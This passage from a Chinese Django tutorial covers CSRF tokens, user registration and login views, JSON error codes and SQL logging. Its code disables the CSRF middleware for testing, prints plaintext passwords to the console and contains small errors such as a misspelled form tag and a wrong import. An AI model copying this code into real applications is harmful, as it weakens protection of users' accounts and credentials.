<span style="color: #a0522d;">MIDDLEWARE</span> = [
    <span style="color: #8b2252;">'django.middleware.security.SecurityMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.sessions.middleware.SessionMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.common.CommonMiddleware'</span>,
    <span style="color: #b22222;"># </span><span style="color: #b22222;">'django.middleware.csrf.CsrfViewMiddleware', #&#27880;&#37322;&#25481;</span>
    <span style="color: #8b2252;">'django.contrib.auth.middleware.AuthenticationMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.messages.middleware.MessageMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.clickjacking.XFrameOptionsMiddleware'</span>,
]
</pre>
</div></li>

<li>csrftoken验证
<ul class="org-ul">
<li>在表单POST提交时，需要发给服务器一个csrf_token</li>
<li><p>
模板中的表单Form中增加 <code>{% csrf_token %}</code> ，它返回到了浏览器端就会为cookie增加csrftoken字段，还会在表单中增加一个名为csrfiddlewaretoken隐藏控件
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">from</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">""</span>, <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span>&gt;
  &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">'hidden'</span>, <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">'csrfmiddlewaretoken'</span>, <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"xxxx"</span>&gt;
  &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">'submit'</span>, <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">'&#25552;&#20132;'</span>
&lt;/<span style="color: #0000ff;">from</span>&gt;
</pre>
</div></li>
<li>POST提交表单数据时，需要将csrfmiddlewaretoken一并提交，Cookie中的csrf_token也一并会提交，最终在中间件中比较，相符通过，不相符就看到上面的403提示</li>
</ul></li>
<li>双cookie验证
<ul class="org-ul">
<li>访问本站先获得csrftoken的cookie</li>
<li>如果使用AJAX进行POST，需要在每一次请求Header中增加自定义字段X-CSRFTOKEN，其值来自cookie中获取的csrftoken值</li>
<li>在服务端比较cookie和X-CSRFTOKEN中的csrftoken，相符通过</li>
</ul></li>
</ol>

<p>
现在没有前端代码，为了测试方便，可以选择第一种方法先禁用中间件，测试完成后开启。
</p>
</div>
</div>
<div id="outline-container-h:40656b8a-5c03-4112-b091-2ffb0a10a251" class="outline-4">
<h4 id="h:40656b8a-5c03-4112-b091-2ffb0a10a251">JSON数据处理</h4>
<div class="outline-text-4" id="text-h:40656b8a-5c03-4112-b091-2ffb0a10a251">
<p>
simplejson标准库方便好用，功能强大。
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install simplejson
</pre>
</div>

<p>
浏览器端提交的数据放在了请求对象的body中，需要使用simplejson解析，解析的方式同Json模块，但是simplejson更方便。
</p>
</div>
</div>
<div id="outline-container-h:ebdf4250-239e-4d66-91a8-70fd5ace2202" class="outline-4">
<h4 id="h:ebdf4250-239e-4d66-91a8-70fd5ace2202">错误处理</h4>
<div class="outline-text-4" id="text-h:ebdf4250-239e-4d66-91a8-70fd5ace2202">
<p>
Django中有很多异常类，定义在django.http下，这些类都继承自HttpResponse。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py&#25991;&#20214;</span>

<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse,HttpRequest,HttpResponseBadRequest,JsonResponse
<span style="color: #a020f0;">import</span> simplejson

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.POST)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print("- " * 30)</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">"password"</span>]
        <span style="color: #483d8b;">print</span>(email,username,password)
        <span style="color: #a020f0;">return</span> JsonResponse({},status=201) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#25104;&#21151;&#36820;&#22238;201</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26377;&#20219;&#20309;&#24322;&#24120;&#65292;&#37117;&#36820;&#22238;</span>
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> HttpResponseBadRequest() <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36825;&#37324;&#36820;&#22238;&#23454;&#20363;&#65292;&#36825;&#19981;&#26159;&#24322;&#24120;&#31867;</span>
</pre>
</div>

<p>
将上面代码增加邮箱检查、用户信息保存功能，就要用到Django的模型操作。
</p>

<p>
本次采用Restful实践的设计，采用返回错误状态码+JSON错误信息方式。
</p>

<p>
但是，因为客户端采用了axios的js库，如果返回400状态码，将不能提取到返回的错误信息。
</p>

<p>
所以，采用返回200状态码+Json，但Json中通过code大于0表示错误，提供msg表示错误描述。
</p>

<p>
服务端生成"错误描述"提供给客户端，错误信息编写成常量调用。
</p>

<p>
也可以在前端代码中生成错误号和错误描述配置信息，服务器端返回特定错误号，就行了。
</p>

<p>
项目根目录下创建一个模块messages.py
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">Messages</span>:
    <span style="color: #a0522d;">INVALID_USERNAME_OR_PASSWORD</span> = {<span style="color: #8b2252;">'code'</span>:1, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#29992;&#25143;&#21517;&#25110;&#23494;&#30721;&#38169;&#35823;'</span>}
    <span style="color: #a0522d;">BAD_REQUEST</span> = {<span style="color: #8b2252;">'code'</span>:2, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#35831;&#27714;&#20449;&#24687;&#38169;&#35823;'</span>}
    <span style="color: #a0522d;">USER_EXISTS</span> = {<span style="color: #8b2252;">'code'</span>:3, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#29992;&#25143;&#24050;&#23384;&#22312;'</span>}
    <span style="color: #a0522d;">NOT_FOUND</span> = {<span style="color: #8b2252;">'code'</span>:4, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#36164;&#28304;&#19981;&#23384;&#22312;'</span>}
</pre>
</div>

<p>
有可能用email登录，那就必须保证它是唯一的。
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">ALTER</span> <span style="color: #a020f0;">TABLE</span> `blog`.`auth_user` 
<span style="color: #a020f0;">MODIFY</span> <span style="color: #a020f0;">COLUMN</span> `email` <span style="color: #228b22;">varchar</span>(128) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> <span style="color: #a020f0;">AFTER</span> `last_name`,
<span style="color: #a020f0;">ADD</span> <span style="color: #a020f0;">UNIQUE</span> INDEX(`email`)
</pre>
</div>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, reg) <span style="color: #b22222;"># </span><span style="color: #b22222;">reg POST /users/</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render, HttpResponse
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponseBadRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.core.handlers.wsgi import WSGIRequest</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">Create your views here.</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-sh">curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/users/'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--data-raw <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "username":"abc",</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "email":"abc@abc.com"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:72822932-1569-44e3-886e-6c593cce7539" class="outline-4">
<h4 id="h:72822932-1569-44e3-886e-6c593cce7539">请求方法限定view装饰器</h4>
<div class="outline-text-4" id="text-h:72822932-1569-44e3-886e-6c593cce7539">
<p>
注册、登录函数都是只支持POST方法，可以在视图函数内部自己判断，也可以使用官方提供的装饰器指定方法。
</p>

<p>
自定义
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render, HttpResponse
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponseBadRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.core.handlers.wsgi import WSGIRequest</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">required_methods</span>(methods):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">method</span>(viewfunc):
        <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwargs):
            <span style="color: #a020f0;">if</span> request.method.lower() <span style="color: #a020f0;">in</span> methods:
                <span style="color: #a0522d;">ret</span> = viewfunc(request, *args, **kwargs)
                <span style="color: #a020f0;">return</span> ret
            <span style="color: #a020f0;">else</span>:
                <span style="color: #a020f0;">return</span> JsonResponse({}, status=405)
        <span style="color: #a020f0;">return</span> wrapper
    <span style="color: #a020f0;">return</span> method

<span style="color: #a0522d;">method_get</span> = required_methods([<span style="color: #8b2252;">'get'</span>])

<span style="color: #b22222;">#</span><span style="color: #b22222;">@required_methods(['get', 'post'])</span>
<span style="color: #228b22;">@method_get</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">if request.method.lower() == 'post': pass</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)
</pre>
</div>

<p>
官方提供
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render, HttpResponse
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponseBadRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_POST, require_GET, require_http_methods
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.core.handlers.wsgi import WSGIRequest</span>

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #a020f0;">pass</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:072b4093-653e-4127-ae38-d10df3504097" class="outline-4">
<h4 id="h:072b4093-653e-4127-ae38-d10df3504097">注册代码 v1</h4>
<div class="outline-text-4" id="text-h:072b4093-653e-4127-ae38-d10df3504097">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">user/views.py&#25991;&#20214;</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render, HttpResponse
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponseBadRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_POST, require_GET, require_http_methods
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.core.handlers.wsgi import WSGIRequest</span>

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">if request.method.lower() == 'post': pass</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20869;&#37096;&#35843;&#29992;&#20102;user.save()</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)
</pre>
</div>

<p>
用户名检查
</p>
<ul class="org-ul">
<li>使用User类的管理器对象objects，查询用户名，可以使用用户名字段唯一索引。如果用户名存在，返回错误信息。</li>
</ul>

<p>
用户信息存储
</p>
<ul class="org-ul">
<li>使用管理器提供的create_user方法，内部会调用save方法。</li>
<li>Django默认在save()、delete()的时候事务自动提交。</li>
<li>如果创建用户有异常，捕获异常做相应的处理;如果没有异常，则返回201，不要返回任何用户信息。</li>
</ul>

<p>
异常处理
</p>
<ul class="org-ul">
<li>出现获取输入框提交信息异常，就返回错误信息</li>
<li>查询用户名存在，返回错误信息</li>
<li>create_user()、save()方法保存数据，有异常，则返回错误信息</li>
<li>注意一点，Django的异常类继承自HttpResponse类，所以不能raise，只能return</li>
<li>前端通过错误号判断是否成功，code为0表示成功</li>
<li>由于采用Restful实践，所有异常全部返回JSON的错误信息，所以一律使用了JsonResponse</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:1c3fa3d6-39ca-4a00-ad25-05029416bb65" class="outline-3">
<h3 id="h:1c3fa3d6-39ca-4a00-ad25-05029416bb65">Django日志</h3>
<div class="outline-text-3" id="text-h:1c3fa3d6-39ca-4a00-ad25-05029416bb65">
<p>
Django的日志配置在settings.py中
</p>

<p>
参考文档: <a href="https://docs.djangoproject.com/en/5.2/topics/logging/#configuring-logging">https://docs.djangoproject.com/en/5.2/topics/logging/#configuring-logging</a>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">LOGGING</span> = {
    <span style="color: #8b2252;">'version'</span>: 1,
    <span style="color: #8b2252;">'disable_existing_loggers'</span>: <span style="color: #008b8b;">False</span>,
    <span style="color: #8b2252;">'handlers'</span>: {
        <span style="color: #8b2252;">'console'</span>: {
            <span style="color: #8b2252;">'class'</span>: <span style="color: #8b2252;">'logging.StreamHandler'</span>,
        },
    },
    <span style="color: #8b2252;">'loggers'</span>: {
        <span style="color: #8b2252;">'django.db.backends'</span>: {
            <span style="color: #8b2252;">'handlers'</span>: [<span style="color: #8b2252;">'console'</span>],
            <span style="color: #8b2252;">'level'</span>: <span style="color: #8b2252;">"DEBUG"</span>,
        },
    },
}
</pre>
</div>

<p>
配置后，就可以在控制台看到执行的SQL语句。
</p>

<p>
注意，settings.py中必须DEBUG=True，同时loggers的level是DEBUG，否则从控制台看不到SQL语句。
</p>
</div>
</div>
</section>
<section id="outline-container-h:6329a26b-e608-496a-9981-bf28deb4b20f" class="outline-2">
<h2 id="h:6329a26b-e608-496a-9981-bf28deb4b20f">登录接口设计和实现</h2>
<div class="outline-text-2" id="text-h:6329a26b-e608-496a-9981-bf28deb4b20f">
<ul class="org-ul">
<li>提供用户注册处理</li>
<li>提供用户登录处理</li>
<li>提供路由配置</li>
</ul>
</div>
<div id="outline-container-h:899060e4-25d5-456f-a443-2106b8113684" class="outline-3">
<h3 id="h:899060e4-25d5-456f-a443-2106b8113684">用户登录接口设计</h3>
<div class="outline-text-3" id="text-h:899060e4-25d5-456f-a443-2106b8113684">
<div class="org-src-container">
<pre class="src src-txt">POST /users/login 用户登录

请求体 application/json
{
    "password":"string",
    "username":"string"
}

响应
200 登录成功
200 登录失败，返回错误号和错误信息描述
</pre>
</div>

<p>
接收用户通过POST方法提交的登录信息，提交的数据是JSON格式数据
</p>

<div class="org-src-container">
<pre class="src src-js">{
    <span style="color: #8b2252;">"password"</span>:<span style="color: #8b2252;">"abc"</span>,
    <span style="color: #8b2252;">"username"</span>:<span style="color: #8b2252;">"abc"</span>
}
</pre>
</div>

<ul class="org-ul">
<li>从auth_user表中username找出匹配的一条记录，验证密码是否正确</li>
<li>验证通过说明是合法用户登录，显示欢迎页面。</li>
<li>验证失败返回错误号和描述。</li>
<li>整个过程都采用AJAX异步过程，用户提交JSON数据，服务端获取数据后处理，返回JSON。</li>
</ul>
</div>
</div>
<div id="outline-container-h:56e75baa-0b75-46df-9cdc-c26ec2d8879d" class="outline-3">
<h3 id="h:56e75baa-0b75-46df-9cdc-c26ec2d8879d">路由配置</h3>
<div class="outline-text-3" id="text-h:56e75baa-0b75-46df-9cdc-c26ec2d8879d">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;user/urls.py&#25991;&#20214;</span>
<span style="color: #a020f0;">from</span> django.conf.urls <span style="color: #a020f0;">import</span> path, include
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, userlogin

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#21435;&#25481;&#21069;&#32512;/users</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>,reg), <span style="color: #b22222;">#</span><span style="color: #b22222;">/users/</span>
    path(<span style="color: #8b2252;">'login'</span>,userlogin), <span style="color: #b22222;">#</span><span style="color: #b22222;">/users/login</span>
]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fcbe48ab-9ee9-4b74-b304-3c5525d97c4f" class="outline-3">
<h3 id="h:fcbe48ab-9ee9-4b74-b304-3c5525d97c4f">Django的认证</h3>
<div class="outline-text-3" id="text-h:fcbe48ab-9ee9-4b74-b304-3c5525d97c4f">
<p>
<a href="https://docs.djangoproject.com/en/5.2/topics/auth/default/">https://docs.djangoproject.com/en/5.2/topics/auth/default/</a>
</p>

<p>
django.contrilb。auth中提供了许多方法.
</p>

<p>
1、authenticate(**credentials)
</p>

<p>
提供了用户认证，即验证用户名以及密码是否正确，检查is_active字段是否为1即激活的用户。
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">user</span> = authentica(username=<span style="color: #8b2252;">'someone'</span>,password=<span style="color: #8b2252;">'somepassword'</span>)
</pre>
</div>

<p>
2、login(HttpRequest,user,backend=None)
</p>

<p>
该函数接受一个HttpRequest对象，以及一个认证了的User对象。
</p>

<p>
不认证密码，只把user注入request，注入request.session[SESSION_KEY]等
</p>

<p>
返回set-cookie，避免下次请求后重新认证。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">user</span> = authenticate(request, username=username, password=password)
<span style="color: #a020f0;">if</span> user <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
    login(request, user)
</pre>
</div>

<p>
3、logout(request)
</p>

<ul class="org-ul">
<li>该函数接受一个HttpRequest对象，无返回值。</li>
<li>当调用该函数时，当前请求的session信息会全部清除</li>
<li>该用户即使没有登录，使用该函数也不会报错</li>
</ul>

<p>
4、@login_required装饰器
</p>

<p>
装饰器视图函数判断是否登录，如果未登录在服务器端跳转到登录页，可指定登录页path
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">@login_requried&#35013;&#39280;view&#20989;&#25968;&#65292;&#35201;&#27714;&#22312;view&#20989;&#25968;&#21069;&#20808;&#26816;&#26597;&#26159;&#21542;&#30331;&#24405;</span>
<span style="color: #a020f0;">from</span> django.contrib.auth.decorators <span style="color: #a020f0;">import</span> login_required

<span style="color: #228b22;">@login_required</span>(login_url=<span style="color: #8b2252;">"/accounts/login/"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">my_view = login_requried(login_url='/accounts/login/')(my_view)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">my_view</span>(request):
    <span style="color: #a020f0;">pass</span>

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">my_view = login_requried(my_view)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">my_view</span>(request): ...
    <span style="color: #a020f0;">pass</span>
</pre>
</div>

<p>
也有一个LoginRequiredMixin类和login_requried类似作用。
</p>
</div>
</div>
<div id="outline-container-h:b183c0a8-f5a1-43b4-9a71-594c25948414" class="outline-3">
<h3 id="h:b183c0a8-f5a1-43b4-9a71-594c25948414">登录代码</h3>
<div class="outline-text-3" id="text-h:b183c0a8-f5a1-43b4-9a71-594c25948414">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
